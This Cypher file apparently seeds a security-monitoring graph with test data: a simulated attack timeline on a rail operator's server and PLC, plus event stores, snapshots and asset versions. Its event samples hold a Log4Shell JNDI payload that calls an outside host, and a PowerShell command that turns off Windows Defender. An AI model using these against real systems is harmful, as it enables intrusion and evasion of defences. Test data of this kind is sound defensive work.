// GAP-004 Sample Data: R6 Temporal Reasoning
// File: gap004_sample_data_r6.cypher
// Created: 2025-11-13
// Purpose: Realistic test data for R6 nodes (4 types, 10+ samples each)

// ==============================================================================
// R6 Node Type 1: TemporalEvent (10 samples)
// ==============================================================================

// Sample 1: Reconnaissance Event - Port Scan
CREATE (temp1:TemporalEvent {
  eventId: "temporal-event-recon-20251113150000",
  eventType: "RECONNAISSANCE",
  timestamp: datetime('2025-11-13T15:00:00Z'),
  source: "external-ip-185.220.101.23",
  data: {
    attackTechnique: "T1046",
    targetPorts: [22, 80, 443, 3389, 8080],
    scanType: "SYN_SCAN",
    packetsCount: 5000,
    duration: 120
  },
  severity: "LOW",
  validFrom: datetime('2025-11-13T15:00:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:00:02Z'),
  retentionUntil: datetime('2026-02-11T15:00:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 2: Exploitation Event - Log4Shell
CREATE (temp2:TemporalEvent {
  eventId: "temporal-event-exploit-20251113150500",
  eventType: "EXPLOITATION",
  timestamp: datetime('2025-11-13T15:05:00Z'),
  source: "device-app-server-01",
  data: {
    attackTechnique: "T1190",
    targetPort: 443,
    payload: "jndi:ldap://185.220.101.23:1389/Exploit",
    cve: "CVE-2021-44228",
    success: true,
    responseCode: 200
  },
  severity: "CRITICAL",
  validFrom: datetime('2025-11-13T15:05:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:05:03Z'),
  retentionUntil: datetime('2026-02-11T15:05:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 3: Persistence Event - Scheduled Task
CREATE (temp3:TemporalEvent {
  eventId: "temporal-event-persist-20251113151000",
  eventType: "PERSISTENCE",
  timestamp: datetime('2025-11-13T15:10:00Z'),
  source: "device-app-server-01",
  data: {
    attackTechnique: "T1053.005",
    taskName: "WindowsUpdateCheck",
    command: "powershell.exe -EncodedCommand <base64>",
    trigger: "LOGON",
    user: "SYSTEM"
  },
  severity: "HIGH",
  validFrom: datetime('2025-11-13T15:10:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:10:01Z'),
  retentionUntil: datetime('2026-02-11T15:10:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 4: Privilege Escalation Event
CREATE (temp4:TemporalEvent {
  eventId: "temporal-event-privesc-20251113151500",
  eventType: "PRIVILEGE_ESCALATION",
  timestamp: datetime('2025-11-13T15:15:00Z'),
  source: "device-app-server-01",
  data: {
    attackTechnique: "T1068",
    exploit: "CVE-2021-34527",
    fromUser: "web_service",
    toUser: "SYSTEM",
    success: true
  },
  severity: "CRITICAL",
  validFrom: datetime('2025-11-13T15:15:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:15:02Z'),
  retentionUntil: datetime('2026-02-11T15:15:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 5: Defense Evasion Event - Disable AV
CREATE (temp5:TemporalEvent {
  eventId: "temporal-event-evasion-20251113152000",
  eventType: "DEFENSE_EVASION",
  timestamp: datetime('2025-11-13T15:20:00Z'),
  source: "device-app-server-01",
  data: {
    attackTechnique: "T1562.001",
    service: "Windows Defender",
    action: "DISABLE",
    method: "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  severity: "HIGH",
  validFrom: datetime('2025-11-13T15:20:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:20:01Z'),
  retentionUntil: datetime('2026-02-11T15:20:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 6: Credential Access Event - Password Dump
CREATE (temp6:TemporalEvent {
  eventId: "temporal-event-credaccess-20251113152500",
  eventType: "CREDENTIAL_ACCESS",
  timestamp: datetime('2025-11-13T15:25:00Z'),
  source: "device-app-server-01",
  data: {
    attackTechnique: "T1003.001",
    tool: "mimikatz",
    target: "lsass.exe",
    credentialsCaptured: 15,
    ntlmHashes: true
  },
  severity: "CRITICAL",
  validFrom: datetime('2025-11-13T15:25:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:25:03Z'),
  retentionUntil: datetime('2026-02-11T15:25:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 7: Discovery Event - Network Mapping
CREATE (temp7:TemporalEvent {
  eventId: "temporal-event-discovery-20251113153000",
  eventType: "DISCOVERY",
  timestamp: datetime('2025-11-13T15:30:00Z'),
  source: "device-app-server-01",
  data: {
    attackTechnique: "T1018",
    command: "nltest /dclist:",
    hostsDiscovered: 45,
    subnetScanned: "192.168.10.0/24"
  },
  severity: "MEDIUM",
  validFrom: datetime('2025-11-13T15:30:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:30:02Z'),
  retentionUntil: datetime('2026-02-11T15:30:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 8: Lateral Movement Event - SMB
CREATE (temp8:TemporalEvent {
  eventId: "temporal-event-lateral-20251113153500",
  eventType: "LATERAL_MOVEMENT",
  timestamp: datetime('2025-11-13T15:35:00Z'),
  source: "device-app-server-01",
  data: {
    attackTechnique: "T1021.002",
    protocol: "SMB",
    targetHost: "device-plc-rail-001",
    credentials: "stolen_ntlm_hash",
    success: true
  },
  severity: "CRITICAL",
  validFrom: datetime('2025-11-13T15:35:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:35:01Z'),
  retentionUntil: datetime('2026-02-11T15:35:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 9: Collection Event - Data Staging
CREATE (temp9:TemporalEvent {
  eventId: "temporal-event-collection-20251113154000",
  eventType: "COLLECTION",
  timestamp: datetime('2025-11-13T15:40:00Z'),
  source: "device-plc-rail-001",
  data: {
    attackTechnique: "T1005",
    filesCollected: 250,
    dataSize: 524288000,
    stagingDirectory: "C:\\Windows\\Temp\\update",
    fileTypes: ["config", "logs", "credentials"]
  },
  severity: "HIGH",
  validFrom: datetime('2025-11-13T15:40:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:40:02Z'),
  retentionUntil: datetime('2026-02-11T15:40:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 10: Exfiltration Event - C2 Upload
CREATE (temp10:TemporalEvent {
  eventId: "temporal-event-exfil-20251113154500",
  eventType: "EXFILTRATION",
  timestamp: datetime('2025-11-13T15:45:00Z'),
  source: "device-plc-rail-001",
  data: {
    attackTechnique: "T1041",
    protocol: "HTTPS",
    destination: "185.220.101.23:443",
    dataSent: 524288000,
    duration: 300,
    encrypted: true
  },
  severity: "CRITICAL",
  validFrom: datetime('2025-11-13T15:45:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:45:03Z'),
  retentionUntil: datetime('2026-02-11T15:45:00Z'),
  compressed: false,
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// ==============================================================================
// R6 Node Type 2: EventStore (10 samples)
// ==============================================================================

// Sample 1: Primary Event Store - Rail Operator
CREATE (store1:EventStore {
  storeId: "event-store-primary-railxyz",
  storeName: "Primary Rail Security Event Store",
  retentionPolicyDays: 90,
  compressionEnabled: true,
  compressionThresholdDays: 30,
  totalEvents: 2458920,
  compressedEvents: 1234560,
  storageUsed: 52428800000,
  lastCleanupDate: datetime('2025-11-13T00:00:00Z'),
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 2: Archive Event Store - Rail Operator
CREATE (store2:EventStore {
  storeId: "event-store-archive-railxyz",
  storeName: "Archive Rail Security Event Store",
  retentionPolicyDays: 365,
  compressionEnabled: true,
  compressionThresholdDays: 7,
  totalEvents: 8750000,
  compressedEvents: 8750000,
  storageUsed: 104857600000,
  lastCleanupDate: datetime('2025-11-12T00:00:00Z'),
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 3: Primary Event Store - Power Grid
CREATE (store3:EventStore {
  storeId: "event-store-primary-powergrid",
  storeName: "Primary Power Grid Event Store",
  retentionPolicyDays: 90,
  compressionEnabled: true,
  compressionThresholdDays: 30,
  totalEvents: 5234780,
  compressedEvents: 2617390,
  storageUsed: 78643200000,
  lastCleanupDate: datetime('2025-11-13T01:00:00Z'),
  customer_namespace: "customer:PowerGrid-Gamma",
  is_shared: false
});

// Sample 4: Primary Event Store - Water Utility
CREATE (store4:EventStore {
  storeId: "event-store-primary-waterutil",
  storeName: "Primary Water Utility Event Store",
  retentionPolicyDays: 90,
  compressionEnabled: true,
  compressionThresholdDays: 30,
  totalEvents: 1890450,
  compressedEvents: 945225,
  storageUsed: 39321600000,
  lastCleanupDate: datetime('2025-11-12T23:00:00Z'),
  customer_namespace: "customer:WaterUtility-Beta",
  is_shared: false
});

// Sample 5: Hot Event Store - Real-time
CREATE (store5:EventStore {
  storeId: "event-store-hot-realtime",
  storeName: "Hot Real-time Event Store",
  retentionPolicyDays: 7,
  compressionEnabled: false,
  compressionThresholdDays: 0,
  totalEvents: 250000,
  compressedEvents: 0,
  storageUsed: 5242880000,
  lastCleanupDate: datetime('2025-11-13T12:00:00Z'),
  customer_namespace: "shared:realtime",
  is_shared: true
});

// Sample 6: Primary Event Store - Manufacturing
CREATE (store6:EventStore {
  storeId: "event-store-primary-mfg",
  storeName: "Primary Manufacturing Event Store",
  retentionPolicyDays: 90,
  compressionEnabled: true,
  compressionThresholdDays: 30,
  totalEvents: 3450890,
  compressedEvents: 1725445,
  storageUsed: 62914560000,
  lastCleanupDate: datetime('2025-11-13T02:00:00Z'),
  customer_namespace: "customer:Manufacturing-Lambda",
  is_shared: false
});

// Sample 7: Primary Event Store - Smart Building
CREATE (store7:EventStore {
  storeId: "event-store-primary-building",
  storeName: "Primary Smart Building Event Store",
  retentionPolicyDays: 90,
  compressionEnabled: true,
  compressionThresholdDays: 30,
  totalEvents: 980450,
  compressedEvents: 490225,
  storageUsed: 26214400000,
  lastCleanupDate: datetime('2025-11-12T22:00:00Z'),
  customer_namespace: "customer:SmartBuilding-Epsilon",
  is_shared: false
});

// Sample 8: Primary Event Store - Gas Pipeline
CREATE (store8:EventStore {
  storeId: "event-store-primary-gaspipe",
  storeName: "Primary Gas Pipeline Event Store",
  retentionPolicyDays: 90,
  compressionEnabled: true,
  compressionThresholdDays: 30,
  totalEvents: 4567890,
  compressedEvents: 2283945,
  storageUsed: 73400320000,
  lastCleanupDate: datetime('2025-11-13T03:00:00Z'),
  customer_namespace: "customer:GasPipeline-Zeta",
  is_shared: false
});

// Sample 9: Compliance Event Store - Audit
CREATE (store9:EventStore {
  storeId: "event-store-compliance-audit",
  storeName: "Compliance Audit Event Store",
  retentionPolicyDays: 2555,
  compressionEnabled: true,
  compressionThresholdDays: 30,
  totalEvents: 45678901,
  compressedEvents: 45678901,
  storageUsed: 314572800000,
  lastCleanupDate: datetime('2025-11-01T00:00:00Z'),
  customer_namespace: "shared:compliance",
  is_shared: true
});

// Sample 10: Threat Intel Event Store
CREATE (store10:EventStore {
  storeId: "event-store-threatintel",
  storeName: "Threat Intelligence Event Store",
  retentionPolicyDays: 365,
  compressionEnabled: true,
  compressionThresholdDays: 7,
  totalEvents: 12345678,
  compressedEvents: 12345678,
  storageUsed: 157286400000,
  lastCleanupDate: datetime('2025-11-10T00:00:00Z'),
  customer_namespace: "shared:threat-intel",
  is_shared: true
});

// ==============================================================================
// R6 Node Type 3: HistoricalSnapshot (10 samples)
// ==============================================================================

// Sample 1: Pre-Attack Snapshot - Rail PLC
CREATE (snapshot1:HistoricalSnapshot {
  snapshotId: "snapshot-pre-attack-plc-20251113145900",
  snapshotType: "PRE_CHANGE",
  timestamp: datetime('2025-11-13T14:59:00Z'),
  scope: "ASSET",
  assetId: "device-plc-rail-001",
  systemState: {
    devices: [{
      deviceId: "device-plc-rail-001",
      status: "ONLINE",
      version: "v3.2.1",
      config: "default_secure"
    }],
    software: [{
      softwareId: "plc-firmware",
      version: "3.2.1",
      vulnerabilities: []
    }],
    network: [{
      connections: 5,
      firewall_rules: 23
    }],
    users: [{
      userId: "admin",
      permissions: "full",
      lastLogin: datetime('2025-11-13T08:00:00Z')
    }]
  },
  compressedState: false,
  storageSize: 1048576,
  retentionUntil: datetime('2026-11-13T14:59:00Z'),
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 2: Post-Incident Snapshot - Rail PLC
CREATE (snapshot2:HistoricalSnapshot {
  snapshotId: "snapshot-post-incident-plc-20251113154600",
  snapshotType: "POST_INCIDENT",
  timestamp: datetime('2025-11-13T15:46:00Z'),
  scope: "ASSET",
  assetId: "device-plc-rail-001",
  systemState: {
    devices: [{
      deviceId: "device-plc-rail-001",
      status: "COMPROMISED",
      version: "v3.2.1",
      config: "modified_suspicious"
    }],
    software: [{
      softwareId: "plc-firmware",
      version: "3.2.1",
      vulnerabilities: ["CVE-2021-44228"]
    }],
    network: [{
      connections: 12,
      firewall_rules: 18
    }],
    users: [{
      userId: "admin",
      permissions: "full",
      lastLogin: datetime('2025-11-13T15:35:00Z')
    }, {
      userId: "SYSTEM",
      permissions: "full",
      lastLogin: datetime('2025-11-13T15:15:00Z')
    }]
  },
  compressedState: false,
  storageSize: 2097152,
  retentionUntil: datetime('2026-11-13T15:46:00Z'),
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 3: Scheduled Snapshot - Network Infrastructure
CREATE (snapshot3:HistoricalSnapshot {
  snapshotId: "snapshot-scheduled-network-20251113120000",
  snapshotType: "SCHEDULED",
  timestamp: datetime('2025-11-13T12:00:00Z'),
  scope: "NETWORK",
  systemState: {
    devices: [{
      deviceId: "router-01",
      status: "ONLINE"
    }, {
      deviceId: "switch-01",
      status: "ONLINE"
    }, {
      deviceId: "firewall-01",
      status: "ONLINE"
    }],
    network: [{
      totalDevices: 150,
      activeConnections: 345,
      bandwidth_utilization: 67.5
    }]
  },
  compressedState: true,
  storageSize: 5242880,
  retentionUntil: datetime('2026-11-13T12:00:00Z'),
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 4: On-Demand Snapshot - Power Grid
CREATE (snapshot4:HistoricalSnapshot {
  snapshotId: "snapshot-ondemand-powergrid-20251113153000",
  snapshotType: "ON_DEMAND",
  timestamp: datetime('2025-11-13T15:30:00Z'),
  scope: "SYSTEM",
  systemState: {
    devices: [{
      deviceId: "device-substation-01",
      status: "OFFLINE"
    }, {
      deviceId: "device-transformer-001",
      status: "DEGRADED"
    }],
    software: [],
    network: [{
      connections: 89,
      firewall_rules: 156
    }]
  },
  compressedState: false,
  storageSize: 10485760,
  retentionUntil: datetime('2026-11-13T15:30:00Z'),
  customer_namespace: "customer:PowerGrid-Gamma",
  is_shared: false
});

// Sample 5: Pre-Change Snapshot - Water Utility
CREATE (snapshot5:HistoricalSnapshot {
  snapshotId: "snapshot-prechange-water-20251113080000",
  snapshotType: "PRE_CHANGE",
  timestamp: datetime('2025-11-13T08:00:00Z'),
  scope: "ASSET",
  assetId: "device-pump-station-03",
  systemState: {
    devices: [{
      deviceId: "device-pump-station-03",
      status: "ONLINE",
      version: "v2.5.0",
      config: "production"
    }],
    software: [{
      softwareId: "pump-controller",
      version: "2.5.0",
      vulnerabilities: []
    }]
  },
  compressedState: false,
  storageSize: 524288,
  retentionUntil: datetime('2026-11-13T08:00:00Z'),
  customer_namespace: "customer:WaterUtility-Beta",
  is_shared: false
});

// Sample 6: Triggered Snapshot - Manufacturing
CREATE (snapshot6:HistoricalSnapshot {
  snapshotId: "snapshot-triggered-mfg-20251113160000",
  snapshotType: "TRIGGERED",
  timestamp: datetime('2025-11-13T16:00:00Z'),
  scope: "ASSET",
  assetId: "device-plc-manufacturing-01",
  systemState: {
    devices: [{
      deviceId: "device-plc-manufacturing-01",
      status: "COMPROMISED",
      version: "v4.1.2",
      config: "modified"
    }],
    software: [{
      softwareId: "java-runtime",
      version: "8u181",
      vulnerabilities: ["CVE-2021-44228"]
    }]
  },
  compressedState: false,
  storageSize: 1572864,
  retentionUntil: datetime('2026-11-13T16:00:00Z'),
  customer_namespace: "customer:Manufacturing-Lambda",
  is_shared: false
});

// Sample 7: Scheduled Snapshot - Smart Building
CREATE (snapshot7:HistoricalSnapshot {
  snapshotId: "snapshot-scheduled-building-20251113060000",
  snapshotType: "SCHEDULED",
  timestamp: datetime('2025-11-13T06:00:00Z'),
  scope: "SYSTEM",
  systemState: {
    devices: [{
      deviceId: "device-hvac-chiller-01",
      status: "ONLINE"
    }, {
      deviceId: "device-hvac-chiller-02",
      status: "STANDBY"
    }],
    network: [{
      connections: 45,
      bandwidth_utilization: 23.5
    }]
  },
  compressedState: true,
  storageSize: 2097152,
  retentionUntil: datetime('2026-11-13T06:00:00Z'),
  customer_namespace: "customer:SmartBuilding-Epsilon",
  is_shared: false
});

// Sample 8: Post-Incident Snapshot - Gas Pipeline
CREATE (snapshot8:HistoricalSnapshot {
  snapshotId: "snapshot-postincident-gas-20251113180500",
  snapshotType: "POST_INCIDENT",
  timestamp: datetime('2025-11-13T18:05:00Z'),
  scope: "ASSET",
  assetId: "device-compressor-station-05",
  systemState: {
    devices: [{
      deviceId: "device-compressor-station-05",
      status: "OFFLINE",
      version: "v3.8.1",
      config: "emergency_shutdown"
    }]
  },
  compressedState: false,
  storageSize: 786432,
  retentionUntil: datetime('2026-11-13T18:05:00Z'),
  customer_namespace: "customer:GasPipeline-Zeta",
  is_shared: false
});

// Sample 9: Organizational Snapshot - Rail Operator
CREATE (snapshot9:HistoricalSnapshot {
  snapshotId: "snapshot-org-rail-20251113000000",
  snapshotType: "SCHEDULED",
  timestamp: datetime('2025-11-13T00:00:00Z'),
  scope: "ORGANIZATION",
  systemState: {
    devices: [{totalDevices: 450, online: 447, offline: 3}],
    software: [{totalSoftware: 89, upToDate: 85, outdated: 4}],
    network: [{totalConnections: 1234, bandwidthUtilization: 45.7}],
    users: [{totalUsers: 125, activeUsers: 98, lockedAccounts: 3}]
  },
  compressedState: true,
  storageSize: 52428800,
  retentionUntil: datetime('2026-11-13T00:00:00Z'),
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 10: On-Demand Snapshot - Forensic Analysis
CREATE (snapshot10:HistoricalSnapshot {
  snapshotId: "snapshot-forensic-analysis-20251113155000",
  snapshotType: "ON_DEMAND",
  timestamp: datetime('2025-11-13T15:50:00Z'),
  scope: "NETWORK",
  systemState: {
    devices: [{
      deviceId: "device-app-server-01",
      status: "QUARANTINED"
    }, {
      deviceId: "device-plc-rail-001",
      status: "ISOLATED"
    }],
    network: [{
      connections: 89,
      suspiciousTraffic: 23,
      blockedIPs: ["185.220.101.23"]
    }]
  },
  compressedState: false,
  storageSize: 15728640,
  retentionUntil: datetime('2026-11-13T15:50:00Z'),
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// ==============================================================================
// R6 Node Type 4: VersionedNode (10 samples)
// ==============================================================================

// Sample 1: Log4j Vulnerable Version
CREATE (version1:VersionedNode {
  versionId: "software-log4j-20240315000000",
  nodeType: "Software",
  nodeId: "software-log4j-core",
  validFrom: datetime('2024-03-15T00:00:00Z'),
  validTo: datetime('2024-08-22T14:30:00Z'),
  transactionTime: datetime('2024-03-15T00:05:32Z'),
  properties: {
    name: "Apache Log4j",
    version: "2.14.1",
    cpe: "cpe:2.3:a:apache:log4j:2.14.1",
    vulnerabilities: ["CVE-2021-44228", "CVE-2021-45046"]
  },
  changeReason: "INITIAL",
  changedBy: "asset-discovery-service",
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 2: Log4j Patched Version
CREATE (version2:VersionedNode {
  versionId: "software-log4j-20240822143000",
  nodeType: "Software",
  nodeId: "software-log4j-core",
  validFrom: datetime('2024-08-22T14:30:00Z'),
  validTo: null,
  transactionTime: datetime('2024-08-22T14:35:12Z'),
  properties: {
    name: "Apache Log4j",
    version: "2.15.0",
    cpe: "cpe:2.3:a:apache:log4j:2.15.0",
    vulnerabilities: []
  },
  changeReason: "PATCH_APPLIED",
  changedBy: "patch-automation-service",
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 3: Device Configuration - Original
CREATE (version3:VersionedNode {
  versionId: "device-plc-rail-001-20250101000000",
  nodeType: "Device",
  nodeId: "device-plc-rail-001",
  validFrom: datetime('2025-01-01T00:00:00Z'),
  validTo: datetime('2025-11-13T15:35:00Z'),
  transactionTime: datetime('2025-01-01T00:10:00Z'),
  properties: {
    name: "Railway PLC Controller",
    status: "ONLINE",
    ipAddress: "192.168.10.15",
    firmwareVersion: "3.2.1",
    configHash: "abc123def456"
  },
  changeReason: "INITIAL",
  changedBy: "system-commissioning",
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 4: Device Configuration - Compromised
CREATE (version4:VersionedNode {
  versionId: "device-plc-rail-001-20251113153500",
  nodeType: "Device",
  nodeId: "device-plc-rail-001",
  validFrom: datetime('2025-11-13T15:35:00Z'),
  validTo: datetime('2025-11-13T16:00:00Z'),
  transactionTime: datetime('2025-11-13T15:36:23Z'),
  properties: {
    name: "Railway PLC Controller",
    status: "COMPROMISED",
    ipAddress: "192.168.10.15",
    firmwareVersion: "3.2.1",
    configHash: "xyz789uvw012"
  },
  changeReason: "INCIDENT_RESPONSE",
  changedBy: "security-monitoring-service",
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 5: Device Configuration - Remediated
CREATE (version5:VersionedNode {
  versionId: "device-plc-rail-001-20251113160000",
  nodeType: "Device",
  nodeId: "device-plc-rail-001",
  validFrom: datetime('2025-11-13T16:00:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T16:05:45Z'),
  properties: {
    name: "Railway PLC Controller",
    status: "ONLINE",
    ipAddress: "192.168.10.15",
    firmwareVersion: "3.3.0",
    configHash: "abc123def456"
  },
  changeReason: "INCIDENT_RESPONSE",
  changedBy: "incident-response-team",
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 6: Component Version - Centrifuge Controller
CREATE (version6:VersionedNode {
  versionId: "component-centrifuge-ctrl-20250601000000",
  nodeType: "Component",
  nodeId: "component-centrifuge-controller",
  validFrom: datetime('2025-06-01T00:00:00Z'),
  validTo: null,
  transactionTime: datetime('2025-06-01T00:15:00Z'),
  properties: {
    name: "Centrifuge Controller Module",
    version: "5.8.2",
    manufacturer: "Siemens",
    model: "S7-1500"
  },
  changeReason: "UPGRADE",
  changedBy: "maintenance-team",
  customer_namespace: "customer:NuclearFacility-Alpha",
  is_shared: false
});

// Sample 7: Configuration Version - Firewall Rules
CREATE (version7:VersionedNode {
  versionId: "config-firewall-rules-20251101000000",
  nodeType: "Configuration",
  nodeId: "config-firewall-main",
  validFrom: datetime('2025-11-01T00:00:00Z'),
  validTo: datetime('2025-11-13T15:00:00Z'),
  transactionTime: datetime('2025-11-01T00:05:00Z'),
  properties: {
    name: "Main Firewall Rules",
    ruleCount: 156,
    lastModified: datetime('2025-11-01T00:00:00Z'),
    configVersion: "v23.11.01"
  },
  changeReason: "CONFIGURATION_CHANGE",
  changedBy: "network-admin",
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 8: Configuration Version - Firewall Rules Updated
CREATE (version8:VersionedNode {
  versionId: "config-firewall-rules-20251113150000",
  nodeType: "Configuration",
  nodeId: "config-firewall-main",
  validFrom: datetime('2025-11-13T15:00:00Z'),
  validTo: null,
  transactionTime: datetime('2025-11-13T15:05:00Z'),
  properties: {
    name: "Main Firewall Rules",
    ruleCount: 163,
    lastModified: datetime('2025-11-13T15:00:00Z'),
    configVersion: "v23.11.13"
  },
  changeReason: "INCIDENT_RESPONSE",
  changedBy: "security-team",
  customer_namespace: "customer:RailOperator-XYZ",
  is_shared: false
});

// Sample 9: Software Version - SCADA System
CREATE (version9:VersionedNode {
  versionId: "software-scada-20250301000000",
  nodeType: "Software",
  nodeId: "software-scada-platform",
  validFrom: datetime('2025-03-01T00:00:00Z'),
  validTo: null,
  transactionTime: datetime('2025-03-01T00:20:00Z'),
  properties: {
    name: "SCADA Platform",
    version: "12.5.0",
    vendor: "Schneider Electric",
    vulnerabilities: []
  },
  changeReason: "UPGRADE",
  changedBy: "system-upgrade-service",
  customer_namespace: "customer:WaterUtility-Beta",
  is_shared: false
});

// Sample 10: Device Version - Substation Transformer
CREATE (version10:VersionedNode {
  versionId: "device-transformer-001-20241215000000",
  nodeType: "Device",
  nodeId: "device-transformer-001",
  validFrom: datetime('2024-12-15T00:00:00Z'),
  validTo: null,
  transactionTime: datetime('2024-12-15T00:30:00Z'),
  properties: {
    name: "Main Substation Transformer",
    status: "ONLINE",
    capacity: 50000000,
    voltage: 138000,
    model: "ABB-TXL-50MVA"
  },
  changeReason: "INITIAL",
  changedBy: "commissioning-team",
  customer_namespace: "customer:PowerGrid-Gamma",
  is_shared: false
});

// ==============================================================================
// END OF R6 SAMPLE DATA
// ==============================================================================
// Total R6 Nodes Created: 40 nodes (10 per type × 4 types)
// Coverage: TemporalEvent, EventStore, HistoricalSnapshot, VersionedNode
// Realistic data includes complete attack timeline, retention management,
// forensic snapshots, and bitemporal versioning
// ==============================================================================
